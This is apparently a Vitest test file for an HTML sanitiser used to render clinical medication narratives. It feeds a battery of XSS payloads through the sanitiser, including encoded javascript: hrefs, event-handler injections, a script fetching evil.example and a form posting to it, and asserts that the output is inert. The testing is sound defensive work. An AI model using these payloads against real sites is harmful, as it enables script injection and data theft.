/**
 * The sanitiser is tested at the boundary the component actually inserts.
 *
 * `Narrative.tsx` renders `sanitiseNarrative(div)` into `innerHTML`, so that
 * function is the thing an attack has to get through, and it is therefore the
 * thing under test here. Testing the tokeniser it delegates to (covered in
 * `display.test.ts`) would leave the caption pre-pass untested, and the pre-pass
 * is the one place output is rewritten before the allowlist sees it.
 *
 * Every assertion below is written as "the payload cannot carry X through",
 * never as "the output equals this string". An equality test on sanitiser output
 * passes for the wrong reason the moment the formatting changes, and the
 * property that matters is what is absent.
 */
import { describe, expect, it } from 'vitest';
import { narrativeMayExceedEntries, narrativeStatus, sanitiseNarrative } from './Narrative';

/** Anything that would make the browser run code, or fetch from a third party. */
function isInert(html: string): boolean {
  const lower = html.toLowerCase();
  return (
    !/\son[a-z]+\s*=/.test(lower) &&
    !lower.includes('<script') &&
    !lower.includes('<iframe') &&
    !lower.includes('<object') &&
    !lower.includes('<embed') &&
    !lower.includes('<svg') &&
    !lower.includes('<form') &&
    !lower.includes('<input') &&
    !lower.includes('<img') &&
    !lower.includes('javascript:') &&
    !lower.includes('data:') &&
    !lower.includes('style=')
  );
}

describe('sanitiseNarrative', () => {
  it('keeps the formatting a clinical narrative is made of', () => {
    const clean = sanitiseNarrative(
      '<div xmlns="http://www.w3.org/1999/xhtml"><table><thead><tr><th>Medicine</th>' +
        '<th>Status</th></tr></thead><tbody><tr><td>Bisoprolol 2.5mg tab</td>' +
        '<td colspan="2">Active</td></tr></tbody></table><ul><li>Chlorhexidine</li></ul></div>',
    );
    expect(clean).toContain('<table>');
    expect(clean).toContain('Bisoprolol 2.5mg tab');
    expect(clean).toContain('colspan="2"');
    expect(clean).toContain('<li>Chlorhexidine</li>');
  });

  it('keeps a caption as a readable block, since a bare caption cannot survive insertion', () => {
    const clean = sanitiseNarrative(
      '<table><caption>Current medicines</caption><tr><td>a</td></tr></table>',
    );
    expect(clean).toContain('Current medicines');
    expect(clean).toContain('narrative-caption');
    expect(clean).not.toContain('<caption');
  });

  it('strips an attribute the payload hung on a caption, rename or no rename', () => {
    const clean = sanitiseNarrative('<caption onclick="alert(1)" style="x">Meds</caption>');
    expect(clean).toContain('Meds');
    expect(isInert(clean)).toBe(true);
  });

  // -------------------------------------------------------------------------
  // The attack battery
  // -------------------------------------------------------------------------

  it('drops an img with an onerror payload, tag and all', () => {
    const clean = sanitiseNarrative('<p>Dispensed <img src=x onerror=alert(1)> today</p>');
    expect(isInert(clean)).toBe(true);
    expect(clean).toContain('Dispensed');
    expect(clean).toContain('today');
  });

  it('refuses a javascript: href but keeps the link text', () => {
    const clean = sanitiseNarrative('<a href="javascript:alert(1)">Minjary Pharmacy</a>');
    expect(clean).toContain('Minjary Pharmacy');
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('href');
  });

  it('drops a nested script, including one hidden inside allowed markup', () => {
    const clean = sanitiseNarrative(
      '<div><p>Before</p><table><tr><td><script>fetch("https://evil.example")</script></td></tr></table><p>After</p></div>',
    );
    expect(isInert(clean)).toBe(true);
    expect(clean).not.toContain('evil.example');
    expect(clean).toContain('Before');
    expect(clean).toContain('After');
  });

  it('drops an svg onload payload with its whole subtree', () => {
    const clean = sanitiseNarrative('<p>a</p><svg onload="alert(1)"><circle r="9"/></svg><p>b</p>');
    expect(isInert(clean)).toBe(true);
    expect(clean).toContain('a');
    expect(clean).toContain('b');
  });

  it('refuses an HTML-entity-encoded javascript: href, which a browser would decode', () => {
    for (const evasion of [
      '<a href="java&#115;cript:alert(1)">x</a>',
      '<a href="&#106;avascript&colon;alert(1)">x</a>',
      '<a href="&#x6a;avascript&#x3a;alert(1)">x</a>',
      '<a href="java&Tab;script:alert(1)">x</a>',
    ]) {
      const clean = sanitiseNarrative(evasion);
      expect(clean, evasion).not.toContain('href');
      expect(isInert(clean), evasion).toBe(true);
    }
  });

  it('refuses a javascript: href broken up by control characters or case', () => {
    expect(sanitiseNarrative('<a href="java\tscript:alert(1)">x</a>')).not.toContain('href');
    expect(sanitiseNarrative('<a href="  JaVaScRiPt:alert(1)">x</a>')).not.toContain('href');
    expect(sanitiseNarrative('<a href="javascript:alert(1)">x</a>')).not.toContain('href');
  });

  it('refuses a data: href, which can carry an entire document', () => {
    const clean = sanitiseNarrative(
      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    );
    expect(clean).not.toContain('data:');
    expect(clean).not.toContain('href');
  });

  it('keeps an ordinary https link, because a narrative is allowed one', () => {
    const clean = sanitiseNarrative('<a href="https://example.org/report?a=1&amp;b=2">Report</a>');
    expect(clean).toContain('href="https://example.org/report?a=1&amp;b=2"');
  });

  it('does not let a malformed start tag smuggle an event handler through', () => {
    expect(isInert(sanitiseNarrative('<p/onclick=alert(1)>hi</p>'))).toBe(true);
    expect(isInert(sanitiseNarrative('<div onmouseover=alert(1) >hi</div>'))).toBe(true);
    expect(isInert(sanitiseNarrative('<div/**/onclick=alert(1)>hi</div>'))).toBe(true);
  });

  it('drops a form, its inputs and anything that could post somewhere', () => {
    const clean = sanitiseNarrative(
      '<form action="https://evil.example"><input name="ihi" value="8003608333647261"></form><p>Real content</p>',
    );
    expect(isInert(clean)).toBe(true);
    expect(clean).not.toContain('evil.example');
    expect(clean).toContain('Real content');
  });

  it('drops a style element and an inline style attribute', () => {
    expect(isInert(sanitiseNarrative('<style>body{display:none}</style><p>a</p>'))).toBe(true);
    expect(isInert(sanitiseNarrative('<p style="position:fixed;inset:0">a</p>'))).toBe(true);
  });

  it('drops an iframe, an object and an embed', () => {
    for (const payload of [
      '<iframe src="https://evil.example"></iframe>',
      '<object data="evil.swf"></object>',
      '<embed src="evil.swf">',
    ]) {
      expect(isInert(sanitiseNarrative(payload)), payload).toBe(true);
    }
  });

  it('escapes a stray angle bracket instead of resuming tag parsing at it', () => {
    const clean = sanitiseNarrative('Potassium < 3.5 mmol/L and pH > 7.45');
    expect(clean).toContain('&lt;');
    expect(clean).toContain('&gt;');
  });

  it('keeps the clinical text inside a wrapper element it is not allowed to render', () => {
    expect(sanitiseNarrative('<article><p>Real content</p></article>')).toBe('<p>Real content</p>');
  });

  it('leaves the hostile fixture narrative inert while keeping every word of it', () => {
    // Verbatim from src/fixtures/platypus.ts, the completed-bactrim entry.
    const clean = sanitiseNarrative(
      '<div xmlns="http://www.w3.org/1999/xhtml"><p><b>medication</b>: Bactrim DS - tablet</p>' +
        '<p onmouseover="alert(1)">Dispensed at <a href="javascript:alert(1)">Minjary Pharmacy</a></p></div>',
    );
    expect(isInert(clean)).toBe(true);
    expect(clean).toContain('Bactrim DS - tablet');
    expect(clean).toContain('Minjary Pharmacy');
  });
});

describe('narrativeStatus', () => {
  it('reads the four defined values and names an absent one', () => {
    expect(narrativeStatus({ status: 'generated' })).toBe('generated');
    expect(narrativeStatus({ status: 'additional' })).toBe('additional');
    expect(narrativeStatus({ status: 'extensions' })).toBe('extensions');
    expect(narrativeStatus({ status: 'empty' })).toBe('empty');
    expect(narrativeStatus({})).toBe('unstated');
    expect(narrativeStatus({ status: 'nonsense' })).toBe('unstated');
  });

  it('treats additional and extensions as possibly saying more than the entries', () => {
    // This is what decides which view a section opens on, so it is the one
    // status distinction with a visible consequence.
    expect(narrativeMayExceedEntries('additional')).toBe(true);
    expect(narrativeMayExceedEntries('extensions')).toBe(true);
    expect(narrativeMayExceedEntries('generated')).toBe(false);
    expect(narrativeMayExceedEntries('unstated')).toBe(false);
  });
});
